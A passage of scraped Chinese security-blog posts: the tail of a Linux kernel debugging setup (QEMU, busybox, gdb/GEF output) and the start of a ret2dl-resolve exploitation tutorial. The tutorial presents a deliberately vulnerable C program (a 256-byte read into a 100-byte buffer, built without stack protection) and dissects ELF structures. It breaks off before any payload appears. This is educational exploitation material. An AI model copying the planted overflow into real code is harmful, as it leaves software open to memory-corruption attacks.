symbols from /usr/lib/debug/boot/vmlinux-4.4.0-92-generic...done.gef➤ p init_uts_ns$1 = &#123; kref = &#123; refcount = &#123; counter = 0x2 &#125; &#125;, name = &#123; sysname = \"Linux\", '\\000' &lt;repeats 59 times&gt;, nodename = \"(none)\", '\\000' &lt;repeats 58 times&gt;, release = \"4.4.0-92-generic\", '\\000' &lt;repeats 48 times&gt;, version = \"#115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017\", '\\000' &lt;repeats 20 times&gt;, machine = \"x86_64\", '\\000' &lt;repeats 58 times&gt;, domainname = \"(none)\", '\\000' &lt;repeats 58 times&gt; &#125;, user_ns = 0xffffffff81e42a00 &lt;init_user_ns&gt;, ns = &#123; stashed = &#123; counter = 0x0 &#125;, ops = 0xffffffff81a1afe0 &lt;utsns_operations&gt;, inum = 0xeffffffe &#125;&#125; Linux KernelLinux 内核源代码肯定少不了： 12345678sudo apt-get install libncurses5-dev build-essential kernel-packagewget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gztar -xvf linux-4.20.17.tar.gzcd linux-4.20.17make menuconfigmakemake allmake modules make menuconfig中需要勾选的： KernelHacking 选中Compile the kernel with debug info 选中Compile the kernel with frame pointers 选中KGDB:kernel debugging with remote gdb Processor type and features 取消Paravirtualized guest support KernelHacking 取消Write protect kernel read-only data structures Busybox启动内核还需要一个简单的文件系统和一些命令，可以使用busybox来构建 123456cdwget https://busybox.net/downloads/busybox-$&#123;VERSION&#125;.tar.bz2tar -jxvf busybox-$&#123;VERSION&#125;.tar.bz2cd $BUSYBOX_SRCmake menuconfigmake install make menuconfig中需要勾选的： Busybox Settings Build Options Build Busybox as a static binary（编译成静态文件） Linux System Utilities 关闭Support mounting NFS file system（网络文件系统） Networking Utilities 关闭inetd (Internet 超级服务器) 接下来在busybox下简单配置一下启动脚本： 123456789cd _installmkdir proc sys dev etc etc/init.dvim etc/init.d/rcSchmod +x etc/init.d/rcScat etc/init.d/rcS# #!/bin/sh# mount -t proc none /proc# mount -t sysfs none /sys# /sbin/mdev -s 然后创建文件系统： 1find . | cpio -o --format=newc &gt; ../rootfs.img 接下来就可以启动系统了： 1qemu-system-x86_64 -kernel $KERNEL_SRC/arch/x86_64/boot/bzImage -initrd $BUSYBOX_SRC/rootfs.img -append \"console=ttyS0 root=/dev/ram rdinit=/sbin/init\" -cpu kvm64,+smep,+smap --nographic -gdb tcp::1234 Finally it Kind-of Works接下来可以用gdb进行调试，同时尝试在函数cmdline_proc_show()处下断点： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495➜ ~ gdb -ex \"target remote localhost:1234\" $KERNEL_SRC/vmlinuxGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...GEF for linux ready, type `gef' to start, `gef config' to configure79 commands loaded for GDB 7.11.1 using Python engine 3.5[*] 1 command could not be loaded, run `gef missing` to know why.Reading symbols from /home/assassinq/linux-4.4.1/vmlinux...done.warning: File \"/home/assassinq/linux-4.4.1/scripts/gdb/vmlinux-gdb.py\" auto-loading has been declined by your `auto-load safe-path' set to \"$debugdir:$datadir/auto-load\".To enable execution of this file add add-auto-load-safe-path /home/assassinq/linux-4.4.1/scripts/gdb/vmlinux-gdb.pyline to your configuration file \"/home/assassinq/.gdbinit\".To completely disable this security protection add set auto-load safe-path /line to your configuration file \"/home/assassinq/.gdbinit\".For more information about this security protection see the\"Auto-loading safe path\" section in the GDB manual. E.g., run from the shell: info \"(gdb)Auto-loading safe path\"Remote debugging using localhost:1234native_safe_halt () at ./arch/x86/include/asm/irqflags.h:5050 &#125;[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0000000000000000 → 0x0000000000000000$rbx : 0xffffffff81d585c0 → 0x0000000000000001 → 0x0000000000000001$rcx : 0x0000000000000000 → 0x0000000000000000$rdx : 0x0000000000000000 → 0x0000000000000000$rsp : 0xffffffff81bf7e98 → &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e$rbp : 0xffffffff81bf7e98 → &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e$rsi : 0x0000000000000000 → 0x0000000000000000$rdi : 0x0000000000000000 → 0x0000000000000000$rip : 0xffffffff810624f6 → 0x000000841f0fc35d → 0x000000841f0fc35d$r8 : 0xffff88000760db60 → 0x0000000000000000 → 0x0000000000000000$r9 : 0x0000000000000000 → 0x0000000000000000$r10 : 0x0000000000000333 → 0x0000000000000333$r11 : 0xffff880006d8bde0 → 0x0000000000000400 → 0x0000000000000400$r12 : 0x0000000000000000 → 0x0000000000000000$r13 : 0x0000000000000000 → 0x0000000000000000$r14 : 0x0000000000000000 → 0x0000000000000000$r15 : 0xffffffff81bf4000 → &lt;init_thread_union+0&gt; add BYTE PTR [rbp-0x40], dl$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ──── 0xffffffff810624f1 &lt;native_safe_halt+1&gt; mov rbp, rsp 0xffffffff810624f4 &lt;native_safe_halt+4&gt; sti 0xffffffff810624f5 &lt;native_safe_halt+5&gt; hlt 0xffffffff810624f6 &lt;native_safe_halt+6&gt; pop rbp 0xffffffff810624f7 &lt;native_safe_halt+7&gt; ret 0xffffffff810624f8 nop DWORD PTR [rax+rax*1+0x0] 0xffffffff81062500 &lt;native_halt+0&gt; push rbp 0xffffffff81062501 &lt;native_halt+1&gt; mov rbp, rsp 0xffffffff81062504 &lt;native_halt+4&gt; hlt────────────────────────────────────────── source:./arch/x86/incl[...].h+50 ──── 45 &#125; 46 47 static inline void native_safe_halt(void) 48 &#123; 49 asm volatile(\"sti; hlt\": : :\"memory\"); → 50 &#125; 51 52 static inline void native_halt(void) 53 &#123; 54 asm volatile(\"hlt\": : :\"memory\"); 55 &#125;─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: \"\", stopped, reason: SIGTRAP───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffff810624f6 → native_safe_halt()[#1] 0xffffffff81020cee → arch_safe_halt()[#2] 0xffffffff81020cee → default_idle()[#3] 0xffffffff8102147f → arch_cpu_idle()[#4] 0xffffffff810c06fa → default_idle_call()[#5] 0xffffffff810c0a37 → cpuidle_idle_call()[#6] 0xffffffff810c0a37 → cpu_idle_loop()[#7] 0xffffffff810c0a37 → cpu_startup_entry(state=&lt;optimized out&gt;)[#8] 0xffffffff8181accc → rest_init()[#9] 0xffffffff81d7f023 → start_kernel()────────────────────────────────────────────────────────────────────────────────gef➤ b cmdline_proc_showBreakpoint 1 at 0xffffffff81276000: file fs/proc/cmdline.c, line 7.gef➤ cContinuing. 在终端输入cat /proc/cmdline后会被断点断下来： 1234567/ # iduid=0 gid=0/ # whoamiwhoami: unknown uid 0/ # pwd// # cat /proc/cmdline 可以跟着源码调试了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263...Breakpoint 1, cmdline_proc_show (m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;) at fs/proc/cmdline.c:77 &#123;[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0xffff880000047ee0 → push rax$rbx : 0x0000000000000000 → 0x0000000000000000$rcx : 0x0000000000003014 → 0x0000000000003014$rdx : 0x0000000000003013 → 0x0000000000003013$rsp : 0xffff880005fc3868 → mov esp, 0xff812245$rbp : 0xffff880005fc38d0 → lock cmp ah, bh$rsi : 0x0000000000000001 → 0x0000000000000001$rdi : 0xffff880005f7c180 → add BYTE PTR [rax], al$rip : 0xffffffff81276000 → &lt;cmdline_proc_show+0&gt; nop DWORD PTR [rax+rax*1+0x0]$r8 : 0xffff880007619bc0 → add BYTE PTR [rax-0xc], al$r9 : 0xffff880005f40000 → add BYTE PTR [rax-0xc], al$r10 : 0x0000000000000001 → 0x0000000000000001$r11 : 0xffff880005fc4000 → 0x0000000000000000 → 0x0000000000000000$r12 : 0xffff880005fc3a88 → 0x0000000000000000 → 0x0000000000000000$r13 : 0xffff880005f7d000 → 0x0000000000000000 → 0x0000000000000000$r14 : 0xffff880005f7c180 → add BYTE PTR [rax], al$r15 : 0x0000000000000001 → 0x0000000000000001$eflags: [CARRY parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0063 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ──── 0xffffffff81275ff7 &lt;cmdline_proc_open+23&gt; repnz cli 0xffffffff81275ff9 &lt;cmdline_proc_open+25&gt; call FWORD PTR [rbp-0x3d] 0xffffffff81275ffc nop DWORD PTR [rax+0x0] 0xffffffff81276000 &lt;cmdline_proc_show+0&gt; nop DWORD PTR [rax+rax*1+0x0] 0xffffffff81276005 &lt;cmdline_proc_show+5&gt; push rbp 0xffffffff81276006 &lt;cmdline_proc_show+6&gt; mov rdx, QWORD PTR [rip+0xcccffb] # 0xffffffff81f43008 &lt;saved_command_line&gt; 0xffffffff8127600d &lt;cmdline_proc_show+13&gt; mov rsi, 0xffffffff81b454d3 0xffffffff81276014 &lt;cmdline_proc_show+20&gt; mov rbp, rsp 0xffffffff81276017 &lt;cmdline_proc_show+23&gt; call 0xffffffff81224970 &lt;seq_printf&gt;──────────────────────────────────────────────── source:fs/proc/cmdline.c+7 ──── 2 #include &lt;linux/init.h&gt; 3 #include &lt;linux/proc_fs.h&gt; 4 #include &lt;linux/seq_file.h&gt; 5 6 static int cmdline_proc_show(struct seq_file *m, void *v) → 7 &#123; 8 seq_printf(m, &quot;%s\\n&quot;, saved_command_line); 9 return 0; 10 &#125; 11 12 static int cmdline_proc_open(struct inode *inode, struct file *file)─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;&quot;, stopped, reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffff81276000 → cmdline_proc_show(m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;)[#1] 0xffffffff812245bc → seq_read(file=0xffff880005f7d000, buf=&lt;optimized out&gt;, size=&lt;optimized out&gt;, ppos=0xffff880005fc3a88)[#2] 0xffffffff8126d4e2 → proc_reg_read(file=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, count=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;)[#3] 0xffffffff811fff55 → do_loop_readv_writev(filp=&lt;optimized out&gt;, iter=0xffff880005fc3958, ppos=0xffff880005fc3a88, fn=0xffffffff8126d4a0 &lt;proc_reg_read&gt;)[#4] 0xffffffff81200d52 → do_readv_writev(type=0x0, file=0xffff880005f7d000, uvector=&lt;optimized out&gt;, nr_segs=&lt;optimized out&gt;, pos=0xffff880005fc3a88)[#5] 0xffffffff81200da6 → vfs_readv(file=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, pos=&lt;optimized out&gt;)[#6] 0xffffffff8123283a → kernel_readv(offset=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, file=&lt;optimized out&gt;)[#7] 0xffffffff8123283a → default_file_splice_read(in=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;, pipe=&lt;optimized out&gt;, len=0xff0000, flags=&lt;optimized out&gt;)[#8] 0xffffffff81231209 → do_splice_to(in=0xffff880005f7d000, ppos=0xffff880005fc3df0, pipe=0xffff880005f7c300, len=0x1000000, flags=0x0)[#9] 0xffffffff812312da → splice_direct_to_actor(in=&lt;optimized out&gt;, sd=0x1 &lt;irq_stack_union+1&gt;, actor=&lt;optimized out&gt;)────────────────────────────────────────────────────────────────────────────────... Referenceshttps://xz.aliyun.com/t/2306https://n132.github.io/2019/07/14/2019-07-14-kernel-Outset/https://github.com/firmianay/CTF-All-In-One/blob/master/doc/4.1_linux_kernel_debug.mdhttp://blog.sina.com.cn/s/blog_3e4774e30102vwqy.html","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"blog.b3ale.cn/tags/linux/"}]},{"title":"A trip of ret2dl-resolve","slug":"A-trip-of-ret2dl-resolve","date":"2019-08-06T08:04:26.000Z","updated":"2019-08-26T05:55:20.464Z","comments":true,"path":"2019/08/06/A-trip-of-ret2dl-resolve/","link":"","permalink":"blog.b3ale.cn/2019/08/06/A-trip-of-ret2dl-resolve/","excerpt":"一步步了解dl-resolve的利用方法。","text":"一步步了解dl-resolve的利用方法。 Intro通过利用ret2dl-resolve绕过 NX 和 ASLR 的限制。 例子如下： 123456789101112131415161718#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln() &#123; char buf[100]; setbuf(stdin, buf); read(0, buf, 256);&#125;int main() &#123; char buf[100] = \"Return to dl_runtime_resolve!\\n\"; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0;&#125;// gcc -o bof -m32 -fno-stack-protector bof.c AnalysisELF HeaderELF 可执行文件由 ELF 头部，程序头部表和其对应的段，节头部表和其对应的节组成，源码在elf.h中实现 一个参与动态链接的可执行文件，它的程序头部表包含类型为PT_DYNAMIC的段，PT_DYNAMIC又包含.dynamic节，程序头的结构如下： 12345678910111213141516171819/* Dynamic section entry. */typedef struct&#123; Elf32_Sword d_tag; /* Dynamic entry type */ union &#123; Elf32_Word d_val; /* Integer value */ Elf32_Addr d_ptr; /* Address value */ &#125; d_un;&#125; Elf32_Dyn;typedef struct&#123; Elf64_Sxword d_tag; /* Dynamic entry type */ union &#123; Elf64_Xword d_val; /* Integer value */ Elf64_Addr d_ptr; /* Address value */ &#125; d_un;&#125; Elf64_Dyn; 执行readelf -d ./bof，其中Tag对应每一个节，比如JMPREL对应着.rel.plt： 12345678910111213141516171819202122232425262728λ readelf -d ./bofDynamic section at offset 0xf14 contains 24 entries: Tag Type Name/Value 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000c (INIT) 0x8048358 0x0000000d (FINI) 0x8048634 0x00000019 (INIT_ARRAY) 0x8049f08 0x0000001b (INIT_ARRAYSZ) 4 (bytes) 0x0000001a (FINI_ARRAY) 0x8049f0c 0x0000001c (FINI_ARRAYSZ) 4 (bytes) 0x6ffffef5 (GNU_HASH) 0x80481ac 0x00000005 (STRTAB) 0x8048278 0x00000006 (SYMTAB) 0x80481d8 0x0000000a (STRSZ) 107 (bytes) 0x0000000b (SYMENT) 16 (bytes) 0x00000015 (DEBUG) 0x0 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 40 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x8048330 0x00000011 (REL) 0x8048318 0x00000012 (RELSZ) 24 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffe (VERNEED) 0x80482f8 0x6fffffff (VERNEEDNUM) 1 0x6ffffff0 (VERSYM) 0x80482e4 0x00000000 (NULL) 0x0 节中包含目标文件的所有信息，节的结构如下： 123456789101112131415161718192021222324252627/* Section header. */typedef struct&#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */&#125; Elf32_Shdr;typedef struct&#123; Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr; 执行readelf -S ./bof，列出了该ELF的 31 个节区： 12345678910111213141516171819202122232425262728293031323334353637383940λ readelf -S ./bofThere are 31 section headers, starting at offset 0x18a4:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 00002c 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481d8 0001d8 0000a0 10 A 6 1 4 [ 6] .dynstr STRTAB 08048278 000278 00006b 00 A 0 0 1 [ 7] .gnu.version VERSYM 080482e4 0002e4 000014 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 080482f8 0002f8 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048318 000318 000018 08 A 5 0 4 [10] .rel.plt REL 08048330 000330 000028 08 AI 5 24 4 [11] .init PROGBITS 08048358 000358 000023 00 AX 0 0 4 [12] .plt PROGBITS 08048380 000380 000060 04 AX 0 0 16 [13] .plt.got PROGBITS 080483e0 0003e0 000008 00 AX 0 0 8 [14] .text PROGBITS 080483f0 0003f0 000242 00 AX 0 0 16 [15] .fini PROGBITS 08048634 000634 000014 00 AX 0 0 4 [16] .rodata PROGBITS 08048648 000648 000008 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 08048650 000650 000034 00 A 0 0 4 [18] .eh_frame PROGBITS 08048684 000684 0000f4 00 A 0 0 4 [19] .init_array INIT_ARRAY 08049f08 000f08 000004 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 08049f0c 000f0c 000004 00 WA 0 0 4 [21] .jcr PROGBITS 08049f10 000f10 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [24] .got.plt PROGBITS 0804a000 001000 000020 04 WA 0 0 4 [25] .data PROGBITS 0804a020 001020 000008 00 WA 0 0 4 [26] .bss NOBITS 0804a040 001028 00000c 00 WA 0 0 32 [27] .comment PROGBITS 00000000 001028 000035 01 MS 0 0 1 [28] .shstrtab STRTAB 00000000 001798 00010a 00 0 0 1 [29] .symtab SYMTAB 00000000 001060 0004b0 10 30 47 4 [30] .strtab STRTAB 00000000 001510 000288 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 其中类型为 REL 的节区包含重定位表项，结构如下： 123456789101112131415/* Relocation table entry without addend (in section of type SHT_REL). */typedef struct&#123; Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /* Relocation type and symbol index */&#125; Elf32_Rel;/* I have seen two different definitions of the Elf64_Rel and Elf64_Rela structures, so we'll leave them out until Novell (or whoever) gets their act together. *//* The following, at least, is used on Sparc v9, MIPS, and Alpha. */typedef struct&#123; Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */&#125; Elf64_Rel; 执行readelf -r ./bof，其中.rel.plt节用于函数重定位，.rel.dyn节用于变量重定位： 123456789101112131415λ readelf -r ./bofRelocation section '.rel.dyn' at offset 0x318 contains 3 entries: Offset Info Type Sym.Value Sym. Name08049ffc 00000306 R_386_GLOB_DAT 00000000 __gmon_start__0804a040 00000905 R_386_COPY 0804a040 stdin@GLIBC_2.00804a044 00000705 R_386_COPY 0804a044 stdout@GLIBC_2.0Relocation section '.rel.plt' at offset 0x330 contains 5 entries: Offset Info Type Sym.Value Sym. Name0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.00804a010 00000207 R_386_JUMP_SLOT 00000000 read@GLIBC_2.00804a014 00000407 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.00804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.00804a01c 00000607 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0 以read为例，read函数的r_offset为=0x0804a010，r_info=0x00000207 .got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值 12345678910111213141516171819/* Symbol table entry. */typedef struct&#123; Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */&#125; Elf32_Sym;typedef struct&#123; Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */&#125; Elf64_Sym; .dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info) 以read为例，read的索引值为ELF32_R_SYM(Elf32_Rel-&gt;r_info)=ELF32_R_SYM(0x00000207)=0x00000207&gt;&gt;8=2，所以Elf32_Sym[2]保存着read的符号表信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192λ readelf -s ./bofSymbol table '.dynsym' contains 10 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND setbuf@GLIBC_2.0 (2) 2: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2) 3: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 4: 00000000 0 FUNC GLOBAL DEFAULT UND strlen@GLIBC_2.0 (2) 5: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.0 (2) 6: 00000000 0 FUNC GLOBAL DEFAULT UND write@GLIBC_2.0 (2) 7: 0804a044 4 OBJECT GLOBAL DEFAULT 26 stdout@GLIBC_2.0 (2) 8: 0804864c 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 9: 0804a040 4 OBJECT GLOBAL DEFAULT 26 stdin@GLIBC_2.0 (2)Symbol table '.symtab' contains 75 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 08048154 0 SECTION LOCAL DEFAULT 1 2: 08048168 0 SECTION LOCAL DEFAULT 2 3: 08048188 0 SECTION LOCAL DEFAULT 3 4: 080481ac 0 SECTION LOCAL DEFAULT 4 5: 080481d8 0 SECTION LOCAL DEFAULT 5 6: 08048278 0 SECTION LOCAL DEFAULT 6 7: 080482e4 0 SECTION LOCAL DEFAULT 7 8: 080482f8 0 SECTION LOCAL DEFAULT 8 9: 08048318 0 SECTION LOCAL DEFAULT 9 10: 08048330 0 SECTION LOCAL DEFAULT 10 11: 08048358 0 SECTION LOCAL DEFAULT 11 12: 08048380 0 SECTION LOCAL DEFAULT 12 13: 080483e0 0 SECTION LOCAL DEFAULT 13 14: 080483f0 0 SECTION LOCAL DEFAULT 14 15: 08048634 0 SECTION LOCAL DEFAULT 15 16: 08048648 0 SECTION LOCAL DEFAULT 16 17: 08048650 0 SECTION LOCAL DEFAULT 17 18: 08048684 0 SECTION LOCAL DEFAULT 18 19: 08049f08 0 SECTION LOCAL DEFAULT 19 20: 08049f0c 0 SECTION LOCAL DEFAULT 20 21: 08049f10 0 SECTION LOCAL DEFAULT 21 22: 08049f14 0 SECTION LOCAL DEFAULT 22 23: 08049ffc 0 SECTION LOCAL DEFAULT 23 24: 0804a000 0 SECTION LOCAL DEFAULT 24 25: 0804a020 0 SECTION LOCAL DEFAULT 25 26: 0804a040 0 SECTION LOCAL DEFAULT 26 27: 00000000 0 SECTION LOCAL DEFAULT 27 28: 00000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 29: 08049f10 0 OBJECT LOCAL DEFAULT 21 __JCR_LIST__ 30: 08048430 0 FUNC LOCAL DEFAULT 14 deregister_tm_clones 31: 08048460 0 FUNC LOCAL DEFAULT 14 register_tm_clones 32: 080484a0 0 FUNC LOCAL DEFAULT 14 __do_global_dtors_aux 33: 0804a048 1 OBJECT LOCAL DEFAULT 26 completed.7209 34: 08049f0c 0 OBJECT LOCAL DEFAULT 20 __do_global_dtors_aux_fin 35: 080484c0 0 FUNC LOCAL DEFAULT 14 frame_dummy 36: 08049f08 0 OBJECT LOCAL DEFAULT 19 __frame_dummy_init_array_ 37: 00000000 0 FILE LOCAL DEFAULT ABS bof.c 38: 00000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 39: 08048774 0 OBJECT LOCAL DEFAULT 18 __FRAME_END__ 40: 08049f10 0 OBJECT LOCAL DEFAULT 21 __JCR_END__ 41: 00000000 0 FILE LOCAL DEFAULT ABS 42: 08049f0c 0 NOTYPE LOCAL DEFAULT 19 __init_array_end 43: 08049f14 0 OBJECT LOCAL DEFAULT 22 _DYNAMIC 44: 08049f08 0 NOTYPE LOCAL DEFAULT 19 __init_array_start 45: 08048650 0 NOTYPE LOCAL DEFAULT 17 __GNU_EH_FRAME_HDR 46: 0804a000 0 OBJECT LOCAL DEFAULT 24 _GLOBAL_OFFSET_TABLE_ 47: 08048630 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini 48: 00000000 0 FUNC GLOBAL DEFAULT UND setbuf@@GLIBC_2.0 49: 00000000 0 FUNC GLOBAL DEFAULT UND read@@GLIBC_2.0 50: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab 51: 08048420 4 FUNC GLOBAL HIDDEN 14 __x86.get_pc_thunk.bx 52: 0804a020 0 NOTYPE WEAK DEFAULT 25 data_start 53: 080484eb 52 FUNC GLOBAL DEFAULT 14 vuln 54: 0804a028 0 NOTYPE GLOBAL DEFAULT 25 _edata 55: 08048634 0 FUNC GLOBAL DEFAULT 15 _fini 56: 0804a020 0 NOTYPE GLOBAL DEFAULT 25 __data_start 57: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 58: 0804a024 0 OBJECT GLOBAL HIDDEN 25 __dso_handle 59: 0804864c 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 60: 00000000 0 FUNC GLOBAL DEFAULT UND strlen@@GLIBC_2.0 61: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_ 62: 00000000 0 FUNC GLOBAL DEFAULT UND write@@GLIBC_2.0 63: 080485d0 93 FUNC GLOBAL DEFAULT 14 __libc_csu_init 64: 0804a040 4 OBJECT GLOBAL DEFAULT 26 stdin@@GLIBC_2.0 65: 0804a04c 0 NOTYPE GLOBAL DEFAULT 26 _end 66: 080483f0 0 FUNC GLOBAL DEFAULT 14 _start 67: 08048648 4 OBJECT GLOBAL DEFAULT 16 _fp_hw 68: 0804a044 4 OBJECT GLOBAL DEFAULT 26 stdout@@GLIBC_2.0 69: 0804a028 0 NOTYPE GLOBAL DEFAULT 26 __bss_start 70: 0804851f 165 FUNC GLOBAL DEFAULT 14 main 71: 00000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses 72: 0804a028 0 OBJECT GLOBAL HIDDEN 25 __TMC_END__ 73: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable 74: 08048358 0 FUNC GLOBAL DEFAULT 11 _init .dynstr节包含了动态链接的字符串。这个节以\\x00作为开始和结尾，中间每个字符串也以\\x00间隔 12345678910111213assassinq&gt;&gt; x/12s 0x080482780x8048278: &quot;&quot;0x8048279: &quot;libc.so.6&quot;0x8048283: &quot;_IO_stdin_used&quot;0x8048292: &quot;stdin&quot;0x8048298: &quot;strlen&quot;0x804829f: &quot;read&quot;0x80482a4: &quot;stdout&quot;0x80482ab: &quot;setbuf&quot;0x80482b2: &quot;__libc_start_main&quot;0x80482c4: &quot;write&quot;0x80482ca: &quot;__gmon_start__&quot;0x80482d9: &quot;GLIBC_2.0&quot; Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read 1234assassinq&gt;&gt; x/wx 0x080481d8+0x10*20x80481f8: 0x00000027assassinq&gt;&gt; x/s 0x08048278+0x270x804829f: &quot;read&quot; .plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置（.plt + Elf32_Sym_size * num） 1234assassinq&gt;&gt; x/3i 0x08048380+0x10*2 0x80483a0 &lt;read@plt&gt;: jmp DWORD PTR ds:0x804a010 0x80483a6 &lt;read@plt+6&gt;: push 0x8 0x80483ab &lt;read@plt+11&gt;: jmp 0x8048380 Lazy Binding在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 